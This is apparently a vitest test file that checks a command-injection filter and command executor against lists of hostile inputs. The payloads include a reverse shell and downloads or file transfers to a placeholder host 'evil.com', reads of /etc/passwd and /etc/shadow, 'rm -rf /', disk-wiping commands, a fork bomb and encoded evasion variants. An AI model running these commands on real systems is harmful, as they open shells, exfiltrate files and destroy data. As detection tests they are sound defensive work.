/**
 * Command Injection Protection Tests
 * Comprehensive validation of command injection security measures
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { CommandExecutor } from '../../src/lib/file-injector/command-executor.js';
import { InjectionPreventionFilter } from '../../src/security/protection/injection-prevention.js';

describe('Command Injection Protection', () => {
  let commandExecutor;
  let injectionFilter;

  beforeEach(async () => {
    commandExecutor = new CommandExecutor();
    injectionFilter = new InjectionPreventionFilter();
    await injectionFilter.initialize();
  });

  describe('Shell Metacharacter Prevention', () => {
    const shellMetacharacters = [
      '; ls -la',
      '| cat /etc/passwd',
      '& whoami',
      '`id`',
      '$(whoami)',
      '&& rm -rf /',
      '|| cat /etc/shadow',
      '; sleep 10',
      '| nc -l 1234',
      '& curl evil.com'
    ];

    it('should block shell metacharacters in commands', async () => {
      for (const payload of shellMetacharacters) {
        const command = `echo "test"${payload}`;
        const isValid = commandExecutor.validateCommand(command);
        expect(isValid).toBe(false);
      }
    });

    it('should detect command injection via injection filter', async () => {
      for (const payload of shellMetacharacters) {
        const result = await injectionFilter.validateString(payload, 'command');
        expect(result.isClean).toBe(false);
        expect(result.threats.some(t => t.type === 'command-injection')).toBe(true);
      }
    });
  });

  describe('Command Substitution Prevention', () => {
    const commandSubstitution = [
      '`whoami`',
      '$(id)',
      '`cat /etc/passwd`',
      '$(curl evil.com)',
      '`wget http://evil.com/shell.sh`',
      '$(nc -e /bin/sh evil.com 1234)',
      '`python -c "import os; os.system(\'ls\')"',
      '$(node -e "require(\'child_process\').exec(\'ls\')")'
    ];

    it('should prevent command substitution attacks', async () => {
      for (const payload of commandSubstitution) {
        const result = await injectionFilter.validateString(payload, 'input');
        expect(result.isClean).toBe(false);
        expect(result.threats.some(t => t.type === 'command-injection')).toBe(true);
      }
    });

    it('should sanitize command substitution patterns', async () => {
      for (const payload of commandSubstitution) {
        const result = await injectionFilter.validateString(payload, 'input');
        expect(result.sanitizedValue).not.toContain('`');
        expect(result.sanitizedValue).not.toContain('$(');
      }
    });
  });

  describe('Network Command Prevention', () => {
    const networkCommands = [
      'nc -l 1234',
      'netcat evil.com 80',
      'telnet evil.com',
      'wget http://evil.com/payload',
      'curl http://evil.com/shell',
      'ssh user@evil.com',
      'scp file user@evil.com:/',
      'rsync -av / user@evil.com:/'
    ];

    it('should block network-related commands', async () => {
      for (const command of networkCommands) {
        const result = await injectionFilter.validateString(command, 'command');
        expect(result.isClean).toBe(false);
        expect(result.threats.some(t => t.type === 'command-injection')).toBe(true);
      }
    });
  });

  describe('Destructive Command Prevention', () => {
    const destructiveCommands = [
      'rm -rf /',
      'del /f /q C:\\*',
      'format C:',
      'fdisk /dev/sda',
      'dd if=/dev/zero of=/dev/sda',
      'mkfs.ext4 /dev/sda1',
      ':(){ :|:& };:', // Fork bomb
      'while true; do echo "bomb"; done'
    ];

    it('should block destructive commands', async () => {
      for (const command of destructiveCommands) {
        const result = await injectionFilter.validateString(command, 'command');
        expect(result.isClean).toBe(false);
        expect(result.threats.some(t => t.type === 'command-injection')).toBe(true);
      }
    });

    it('should prevent execution of dangerous commands', async () => {
      for (const command of destructiveCommands) {
        const isValid = commandExecutor.validateCommand(command);
        expect(isValid).toBe(false);
      }
    });
  });

  describe('Environment Variable Manipulation', () => {
    const envVarAttacks = [
      'PATH=/tmp:$PATH',
      'LD_PRELOAD=/tmp/evil.so',
      'HOME=/tmp',
      'SHELL=/bin/bash -c "rm -rf /"',
      'IFS=$\'\\n\\t\'; rm -rf /',
      'PS1=$(whoami)',
      'PROMPT_COMMAND="curl evil.com"'
    ];

    it('should detect environment variable manipulation', async () => {
      for (const attack of envVarAttacks) {
        const result = await injectionFilter.validateString(attack, 'environment');
        expect(result.isClean).toBe(false);
      }
    });
  });

  describe('Code Execution Prevention', () => {
    const codeExecution = [
      'python -c "import os; os.system(\'ls\')"',
      'node -e "require(\'child_process\').exec(\'whoami\')"',
      'php -r "system(\'ls\');"',
      'ruby -e "system(\'whoami\')"',
      'perl -e "system(\'ls\')"',
      'bash -c "whoami"',
      'sh -c "id"',
      'eval "whoami"',
      'exec("ls")'
    ];

    it('should prevent code execution attempts', async () => {
      for (const code of codeExecution) {
        const result = await injectionFilter.validateString(code, 'code');
        expect(result.isClean).toBe(false);
        expect(result.threats.some(t => t.type === 'command-injection')).toBe(true);
      }
    });
  });

  describe('URL Encoding and Obfuscation', () => {
    const encodedAttacks = [
      '%3B%20ls%20-la', // ; ls -la
      '%7C%20cat%20%2Fetc%2Fpasswd', // | cat /etc/passwd
      '%26%26%20whoami', // && whoami
      '%60whoami%60', // `whoami`
      '%24%28id%29', // $(id)
      'echo%20%22test%22%3B%20rm%20-rf%20%2F' // echo "test"; rm -rf /
    ];

    it('should detect URL-encoded command injection', async () => {
      for (const encoded of encodedAttacks) {
        // Decode and test
        const decoded = decodeURIComponent(encoded);
        const result = await injectionFilter.validateString(decoded, 'input');
        expect(result.isClean).toBe(false);
      }
    });

    it('should handle double encoding', async () => {
      const doubleEncoded = '%253B%2520ls%2520-la'; // Double encoded "; ls -la"
      const decoded = decodeURIComponent(decodeURIComponent(doubleEncoded));
      const result = await injectionFilter.validateString(decoded, 'input');
      expect(result.isClean).toBe(false);
    });
  });

  describe('Unicode and Character Set Evasion', () => {
    const unicodeAttacks = [
      '\u003B ls -la', // Unicode semicolon
      '\uFF1C script\uFF1E', // Fullwidth characters
      '\u2215etc\u2215passwd', // Division slash instead of forward slash
      'cmd\u2215c\u0020dir', // Unicode space and division slash
      '\u0000whoami' // Null byte
    ];

    it('should detect Unicode-based evasion attempts', async () => {
      for (const attack of unicodeAttacks) {
        const result = await injectionFilter.validateString(attack, 'unicode-test');
        expect(result.isClean).toBe(false);
      }
    });
  });

  describe('Time-based Injection Detection', () => {
    it('should detect time-based command injection attempts', async () => {
      const timeBasedAttacks = [
        '; sleep 10',
        '&& timeout 10',
        '| sleep 5',
        '`sleep 3`',
        '$(sleep 2)'
      ];

      for (const attack of timeBasedAttacks) {
        const result = await injectionFilter.validateString(attack, 'timing');
        expect(result.isClean).toBe(false);
        expect(result.threats.some(t => t.type === 'command-injection')).toBe(true);
      }
    });
  });

  describe('Legitimate Command Validation', () => {
    it('should allow safe commands', async () => {
      const safeCommands = [
        'echo "Hello World"',
        'cat file.txt',
        'ls',
        'pwd',
        'date',
        'whoami'
      ];

      for (const command of safeCommands) {
        const result = await injectionFilter.validateString(command, 'safe-command');
        expect(result.isClean).toBe(true);
      }
    });

    it('should validate command executor with safe commands', () => {
      const safeCommands = [
        'echo test',
        'cat README.md',
        'ls -la'
      ];

      for (const command of safeCommands) {
        const isValid = commandExecutor.validateCommand(command);
        expect(isValid).toBe(true);
      }
    });
  });

  describe('Performance and DoS Protection', () => {
    it('should handle large payloads efficiently', async () => {
      const largePayload = 'echo ' + 'A'.repeat(10000) + '; rm -rf /';
      const startTime = performance.now();
      
      const result = await injectionFilter.validateString(largePayload, 'performance');
      const endTime = performance.now();
      
      expect(result.isClean).toBe(false);
      expect(endTime - startTime).toBeLessThan(1000); // Should complete quickly
    });

    it('should prevent regex DoS with complex patterns', async () => {
      const complexPayload = ';'.repeat(1000) + ' ls';
      const startTime = performance.now();
      
      const result = await injectionFilter.validateString(complexPayload, 'regex-dos');
      const endTime = performance.now();
      
      expect(result.isClean).toBe(false);
      expect(endTime - startTime).toBeLessThan(500); // Should not hang
    });
  });

  describe('Context-Aware Validation', () => {
    it('should apply different rules based on context', async () => {
      const payload = 'ls -la';
      
      // Should be dangerous in user input
      const userInputResult = await injectionFilter.validateString(payload, 'user-input');
      expect(userInputResult.isClean).toBe(false);
      
      // Might be acceptable in command context (depending on implementation)
      const commandResult = await injectionFilter.validateString(payload, 'system-command');
      // This depends on your specific security policy
    });
  });
});